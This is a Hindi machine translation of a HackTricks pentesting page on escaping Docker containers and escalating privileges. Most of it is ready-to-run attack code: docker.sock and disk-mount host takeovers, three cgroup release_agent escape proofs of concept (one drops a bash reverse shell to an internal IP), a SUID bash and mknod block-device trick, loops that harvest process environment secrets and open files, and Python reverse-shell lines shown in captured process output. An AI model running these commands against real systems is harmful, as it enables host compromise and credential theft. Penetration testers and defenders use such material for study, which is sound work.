# Docker Breakout / विशेषाधिकार उन्नयन

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का** अनुसरण करें।**
* **अपने हैकिंग ट्रिक्स साझा करें और PRs सबमिट करें** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को**

</details>

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और आसानी से बनाएं और **स्वचालित कार्यप्रवाह** को चलाएं जो दुनिया के **सबसे उन्नत** समुदाय उपकरणों द्वारा संचालित होता है।\
आज ही पहुंच प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## स्वचालित जाँच और छूट

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): यह भी **कंटेनरों की जाँच कर सकता है**
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): यह उपकरण कंटेनर की जाँच करने के लिए बहुत **उपयोगी है, यहां तक कि स्वचालित छूट करने का प्रयास भी कर सकता है**
* [**amicontained**](https://github.com/genuinetools/amicontained): इस्तेमाली उपकरण कंटेनर में होने वाली विशेषाधिकारों को प्राप्त करने के लिए, ताकि इससे छूटने के तरीके ढूंढ़ सकें
* [**deepce**](https://github.com/stealthcopter/deepce): कंटेनरों की जाँच और छूट के लिए उपकरण
* [**grype**](https://github.com/anchore/grype): छवि में स्थापित सॉफ़्टवेयर में मौजूद CVEs प्राप्त करें

## माउंटेड डॉकर सॉकेट छूट

यदि किसी तरह से आपको पता चलता है कि **डॉकर सॉकेट माउंट हो रहा है** डॉकर कंटेनर के अंदर, तो आप इससे छूट सकेंगे।\
यह आमतौर पर डॉकर कंटेनर में होता है जो किसी कारण से डॉकर डेमन से कनेक्ट होने की आवश्यकता होती है कार्रवाई करने के लिए।
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
इस मामले में आप सामान्य डॉकर कमांड का उपयोग करके डॉकर डीमन के साथ संवाद कर सकते हैं:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
यदि **डॉकर सॉकेट अप्रत्याशित स्थान पर है** तो आप इसके साथ अभी भी संवाद कर सकते हैं उपयोग करके **`docker`** कमांड का उपयोग करके **`-H unix:///path/to/docker.sock`** पैरामीटर के साथ
{% endhint %}

डॉकर डेमन एक पोर्ट में भी सुन रहा हो सकता है (डिफ़ॉल्ट 2375, 2376) या सिस्टमड पर आधारित सिस्टमों पर, डॉकर डेमन के साथ संवाद fd:// सॉकेट के माध्यम से हो सकता है।

{% hint style="info" %}
इसके अलावा, अन्य उच्च स्तरीय रनटाइम के रनटाइम सॉकेट पर ध्यान दें:

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Capabilities दुरुपयोग छुटकारा

आपको कंटेनर की क्षमताओं की जांच करनी चाहिए, यदि इसमें निम्नलिखित में से कोई भी होती है, तो आप इससे छुटकारा पा सकते हैं: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

आप **पहले से उल्लिखित स्वचालित उपकरणों** या निम्नलिखित तरीके से वर्तमान में कंटेनर क्षमताओं की जांच कर सकते हैं:
```bash
capsh --print
```
निम्नलिखित पृष्ठ पर आप **लिनक्स क्षमताओं के बारे में और उन्हें दुरुपयोग करके विशेषाधिकारों को छोड़ने/उन्नयन करने** के बारे में अधिक जान सकते हैं:

{% content-ref url="../../linux-capabilities.md" %}
[linux-capabilities.md](../../linux-capabilities.md)
{% endcontent-ref %}

## विशेषाधिकार से बाहर निकलें

विशेषाधिकृत कंटेनर `--privileged` फ्लैग के साथ बनाया जा सकता है या विशेष रक्षाओं को अक्षम करके:

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `Mount /dev`

`--privileged` फ्लैग में बड़ी सुरक्षा चिंताओं को प्रस्तुत करता है, और इस शोषण पर आधारित है जो इसे सक्षम करने के साथ एक डॉकर कंटेनर को लॉन्च करने पर निर्भर करता है। इस फ्लैग का उपयोग करते समय, कंटेनरों को सभी उपकरणों तक पूर्ण पहुंच होती है और उन्हें seccomp, AppArmor और लिनक्स क्षमताओं की सीमाओं से वंचित कर दिया जाता है। आप इस पृष्ठ में `--privileged` के सभी प्रभाव पढ़ सकते हैं:

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### विशेषाधिकृत + hostPID

इन अनुमतियों के साथ आप सीधे **मूल में रूट के रूप में चल रहे प्रक्रिया के नेमस्पेस में जा सकते हैं** जैसे init (pid:1) बस इसे चला रहे हैं: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

इसे एक कंटेनर में परीक्षण करें जो निम्नलिखित को निष्पादित करता है:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### विशेषाधिकारी

केवल विशेषाधिकारी ध्वज के साथ आप मेजबान की डिस्क तक पहुंचने का प्रयास कर सकते हैं या रिलीज_एजेंट या अन्य भगोड़ा का दुरुपयोग करके बचने का प्रयास कर सकते हैं।

निम्नलिखित बाइपास को कंटेनर में परीक्षण करें:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### डिस्क माउंट करना - Poc1

अच्छी तरह से कॉन्फ़िगर किए गए डॉकर कंटेनर्स **fdisk -l** जैसे कमांड को अनुमति नहीं देंगे। हालांकि, यदि `--privileged` या `--device=/dev/sda1` फ़्लैग के साथ गलत ढंग से कॉन्फ़िगर किए गए डॉकर कमांड हो, तो होस्ट ड्राइव देखने के लिए विशेषाधिकार प्राप्त करना संभव होता है।

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

इसलिए, होस्ट मशीन पर काबिज़ होना बहुत आसान है:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
और वहां! अब आप मेजबान की फ़ाइल सिस्टम तक पहुंच सकते हैं क्योंकि यह `/mnt/hola` फ़ोल्डर में माउंट हो गया है।

#### डिस्क माउंट करना - Poc2

कंटेनर के भीतर, एक हमलावर्धक में आक्रमण करने वाला व्यक्ति क्लस्टर द्वारा बनाए गए एक लिखने योग्य hostPath वॉल्यूम के माध्यम से मूल होस्ट ओएस तक और पहुंच प्राप्त करने का प्रयास कर सकता है। नीचे कुछ आम चीजें हैं जिन्हें आप कंटेनर के भीतर जांच सकते हैं ताकि आप इस हमलावर्धक वेक्टर का उपयोग कर सकें:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### विशेषाधिकार छूट: मौजूदा release\_agent का दुरुपयोग करके ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="प्रारंभिक PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
#### निहित छूट बनाने के लिए निर्मित release_agent का दुरुपयोग ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2

{% code title="दूसरा PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

इस तकनीक की **व्याख्या** निम्नलिखित में दी गई है:

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### ज्ञात रास्ते के बिना release\_agent का दुरुपयोग करके विशेषाधिकार छूट - PoC3

पिछले अपराधों में **मेजबान फ़ाइल सिस्टम में कंटेनर का पूर्ण पथ उजागर होता है**। हालांकि, यह हमेशा संभव नहीं होता है। जहां आपको **मेजबान के अंदर कंटेनर का पूर्ण पथ नहीं पता होता है**, आप इस तकनीक का उपयोग कर सकते हैं:

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
एक प्रिविलेज्ड कंटेनर के भीतर PoC को निष्पादित करने से आउटपुट ऐसा होना चाहिए:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### विशेषाधिकारिक भूमिका का उपयोग संवेदनशील माउंट का उपयोग करके

कई फ़ाइलें हो सकती हैं जो माउंट की जा सकती हैं जो **अंतर्निहित होस्ट के बारे में जानकारी देती हैं**। इनमें से कुछ ऐसी भी हो सकती हैं जो **होस्ट द्वारा कुछ होने पर कुछ कार्य करने की संकेत देती हैं** (जिससे हमलावर निकल सकता है)।\
इन फ़ाइलों का दुरुपयोग यह संभव बना सकता है कि:

* release\_agent (पहले से ही शामिल किया गया है)
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

हालांकि, आप इस पृष्ठ में जांच करने के लिए **अन्य संवेदनशील फ़ाइलें** भी खोज सकते हैं:

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### अनियमित माउंट

कई अवसरों में आपको पाया जाएगा कि **कंटेनर में होस्ट से कुछ वॉल्यूम माउंट किया गया है**। यदि यह वॉल्यूम सही ढंग से कॉन्फ़िगर नहीं किया गया है, तो आप **संवेदनशील डेटा तक पहुंच/संशोधित कर सकते हैं**: गुप्त सीक्रेट पढ़ें, एसएसएच अधिकृत\_कुंजी बदलें...
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### 2 शेल्स और होस्ट माउंट के साथ प्रिविलेज एस्कलेशन

यदि आपके पास किसी कंटेनर के अंदर **रूट के रूप में एक्सेस** है जिसमें होस्ट से कुछ फ़ोल्डर माउंट है और आप **गैर-प्रिविलेज्ड उपयोगकर्ता के रूप में होस्ट पर बाहर निकल गए** हैं और माउंटेड फ़ोल्डर पर पढ़ने की अनुमति है।\
आप **कंटेनर के अंदर माउंटेड फ़ोल्डर** में एक **बैश सुइड फ़ाइल** बना सकते हैं और इसे **होस्ट से एक्सेक्यूट** करके प्रिविलेज एस्केलेशन कर सकते हैं।
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### 2 शेल्स के साथ प्रिविलेज एस्कलेशन

यदि आपके पास **कंटेनर के भीतर रूट एक्सेस** है और आपने **गैर प्रिविलेज्ड उपयोगकर्ता के रूप में होस्ट से बाहर निकल लिया है**, तो आप दोनों शेल का उपयोग करके **होस्ट के अंदर प्रिविलेज एस्कलेशन** कर सकते हैं यदि आपके पास कंटेनर के भीतर क्षमता MKNOD है (यह डिफ़ॉल्ट रूप से है) जैसा कि [**इस पोस्ट में विवरणित किया गया है**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)।\
इस तरह की क्षमता के साथ, कंटेनर के भीतर रूट उपयोगकर्ता को **ब्लॉक डिवाइस फ़ाइलें बनाने की अनुमति होती है**। डिवाइस फ़ाइलें विशेष फ़ाइलें हैं जो **आधारभूत हार्डवेयर और कर्नल मॉड्यूल तक पहुंचने** के लिए उपयोग की जाती हैं। उदाहरण के लिए, /dev/sda ब्लॉक डिवाइस फ़ाइल सिस्टम डिस्क पर **रॉ डेटा पढ़ने की पहुंच** देती है।

डॉकर सुनिश्चित करता है कि ब्लॉक डिवाइस **कंटेनर के भीतर से दुरुपयोग नहीं हो सकते** हैं, क्योंकि इसके लिए कंटेनर पर cgroup नीति सेट की जाती है जो ब्लॉक डिवाइस के पढ़ने और लिखने को ब्लॉक करती है।\
हालांकि, यदि कंटेनर के भीतर एक ब्लॉक डिवाइस **कंटेनर के बाहर किसी व्यक्ति द्वारा बनाया जाता है**, तो उसे /proc/PID/root/ फ़ोल्डर के माध्यम से एक व्यक्ति **कंटेनर के बाहर** द्वारा एक्सेस किया जा सकता है, सीमा यह है कि **प्रक्रिया को बाहर और कंटेनर के भीतर एक ही उपयोगकर्ता के द्वारा स्वामित्व होना चाहिए**।

**शोषण** का उदाहरण इस [**लेख में**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/) दिया गया है:
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

यदि आप होस्ट के प्रक्रियाओं तक पहुंच सकते हैं, तो आप उन प्रक्रियाओं में संग्रहित बहुत सारी संवेदनशील जानकारी तक पहुंच सकेंगे। टेस्ट लैब चलाएँ:
```
docker run --rm -it --pid=host ubuntu bash
```
उदाहरण के लिए, आप `ps auxn` की तरह कुछ चीजों की सूची बना सकेंगे और कमांड में संवेदनशील विवरणों की खोज कर सकेंगे।

फिर, जैसा कि आप **/proc/ में होस्ट के प्रत्येक प्रक्रिया तक पहुंच सकते हैं, आप उनके env सीक्रेट्स चोरी कर सकते हैं** जो निम्नलिखित को चला कर:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
आप अन्य प्रक्रियाओं के फ़ाइल डिस्क्रिप्टर्स तक पहुंच सकते हैं और उनकी खुली फ़ाइलें पढ़ सकते हैं:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
आप भी **प्रक्रियाओं को मार सकते हैं और एक डीओएस का कारण बना सकते हैं**।

{% hint style="warning" %}
यदि आपके पास किसी तरह से एक कंटेनर के बाहर की प्रिविलेज्ड **प्रक्रिया पर पहुंच है**, तो आप कुछ इस प्रकार चला सकते हैं `nsenter --target <pid> --all` या `nsenter --target <pid> --mount --net --pid --cgroup` जिससे आपको उम्मीद है कि उस प्रक्रिया के साथ एक ही एनएस प्रतिबंधों (आशा है कि कोई नहीं) वाला शेल चलाने के लिए मिलेगा।
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
यदि एक कंटेनर Docker [होस्ट नेटवर्किंग ड्राइवर (`--network=host`)](https://docs.docker.com/network/host/) के साथ कॉन्फ़िगर किया गया होता है, तो उस कंटेनर का नेटवर्क स्टैक Docker होस्ट से अलग नहीं होता है (कंटेनर होस्ट के नेटवर्किंग नेमस्पेस को साझा करता है), और कंटेनर को अपना आईपी-पता आवंटित नहीं किया जाता है। दूसरे शब्दों में, **कंटेनर सभी सेवाएं सीधे होस्ट के आईपी पर बाइंड करता है**। इसके अलावा, कंटेनर **वे सभी नेटवर्क ट्रैफ़िक को भी अंतर्गत कर सकता है जो होस्ट** साझा इंटरफ़ेस `tcpdump -i eth0` पर भेज रहा है और प्राप्त कर रहा है।

उदाहरण के रूप में, आप इसका उपयोग करके **होस्ट और मेटाडेटा इंस्टेंस के बीच ट्रैफ़िक को स्निफ़ और स्पूफ़ करने** के लिए कर सकते हैं।

जैसे निम्नलिखित उदाहरणों में:

* [लेख: Google SRE से संपर्क कैसे करें: क्लाउड SQL में शैल ड्रॉप करना](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [मेटाडेटा सेवा MITM रूट प्रिविलेज एस्केलेशन की अनुमति देता है (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

आप होस्ट के अंदर बाइंड किए गए **लोकलहोस्ट पर नेटवर्क सेवाओं तक पहुंच सकेंगे** या फिर नोड की **मेटाडेटा अनुमतियों तक पहुंच सकेंगे** (जो कंटेनर तक पहुंचने की अनुमति नहीं हो सकती है)।

### hostIPC
```
docker run --rm -it --ipc=host ubuntu bash
```
यदि आपके पास केवल `hostIPC=true` है, तो आप बहुत कुछ नहीं कर सकते हैं। यदि होस्ट पर कोई प्रक्रिया या किसी अन्य पॉड के भीतर कोई प्रक्रियाएं होस्ट के **इंटर-प्रोसेस संचार तंत्र** (साझा मेमोरी, सेमाफोर अर्रे, संदेश कतारें, आदि) का उपयोग कर रही हैं, तो आप उनी संचार तंत्रों में पढ़ने/लिखने कर सकेंगे। पहली जगह जहां आप देखना चाहेंगे, वह है `/dev/shm`, क्योंकि यह `hostIPC=true` वाले किसी भी पॉड और होस्ट के बीच साझा होता है। आपको `ipcs` के साथ अन्य IPC तंत्रों की जांच भी करनी चाहिए।

* **/dev/shm की जांच करें** - इस साझी स्मृति स्थान में किसी भी फ़ाइल के लिए देखें: `ls -la /dev/shm`
* **मौजूदा IPC सुविधाओं की जांच करें** - आप `/usr/bin/ipcs` के साथ देख सकते हैं कि क्या कोई IPC सुविधाएं उपयोग की जा रही हैं। इसे इस प्रकार जांचें: `ipcs -a`

### क्षमताओं को पुनर्प्राप्त करें

यदि सिस्कॉल **`unshare`** प्रतिबंधित नहीं है, तो आप निम्नलिखित कमांड चलाकर सभी क्षमताएं पुनर्प्राप्त कर सकते हैं:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### उपयोगकर्ता नेमस्पेस द्वारा सिंबलिंक का दुरुपयोग

पोस्ट [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) में विवरणित दूसरी तकनीक बताती है कि आप कैसे उपयोगकर्ता नेमस्पेस के साथ बाइंड माउंट का दुरुपयोग करके होस्ट के भीतर के फ़ाइलों को प्रभावित कर सकते हैं (उस विशेष मामले में, फ़ाइलें हटा दें)।

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) का उपयोग करें और आसानी से वर्कफ़्लो बनाएं और संचालित करें, जो दुनिया के सबसे उन्नत समुदाय उपकरणों द्वारा संचालित होते हैं।\
आज ही पहुंच प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## CVEs

### Runc exploit (CVE-2019-5736)

यदि आप `docker exec` को रूट के रूप में निष्पादित कर सकते हैं (संभवतः sudo के साथ), तो आप CVE-2019-5736 का दुरुपयोग करके एक कंटेनर से बाहर निकलकर विशेषाधिकारों को बढ़ा सकते हैं (यहां एक्सप्लॉइट [यहां](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go) है)। यह तकनीक मूल रूप से **होस्ट** से **कंटेनर** के _**/bin/sh**_ बाइनरी को **अधिलेखित** करेगी, इसलिए कोई भी docker exec को ट्रिगर कर सकता है।

पेलोड को अनुसार बदलें और `go build main.go` के साथ main.go को बिल्ड करें। परिणामस्वरूपी बाइनरी को कंटेनर में निष्पादित करने के लिए रखा जाना चाहिए।\
निष्पादन के दौरान, जैसे ही यह `[+] Overwritten /bin/sh successfully` प्रदर्शित करता है, आपको होस्ट मशीन से निम्नलिखित को निष्पादित करना होगा:

`docker exec -it <container-name> /bin/sh`

इससे मुख्य गो फ़ाइल में मौजूद पेलोड ट्रिगर होगा।

अधिक जानकारी के लिए: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
कंटेनर किसी अन्य CVE के प्रति संकटग्रस्त हो सकता है, आप [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list) में सूची देख सकते हैं।
{% endhint %}

## Docker Custom Escape

### Docker Escape Surface

